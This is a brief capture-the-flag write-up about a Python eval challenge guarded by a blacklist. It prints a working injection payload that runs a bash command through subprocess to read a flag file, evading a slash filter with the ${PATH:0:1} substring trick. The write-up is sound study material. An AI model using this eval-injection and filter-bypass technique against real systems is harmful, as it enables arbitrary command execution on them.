# made by Mel

it's essentially an eval statement, but with some blacklisting.

this was the payload i used. it bypassed slashes by using ${PATH:0:1} (the path variable substringed to just be a slash), along with some extra funnies

`__import__("subprocess").check_output(["bash","-c","cat ${PATH:0:1}flag*"])`
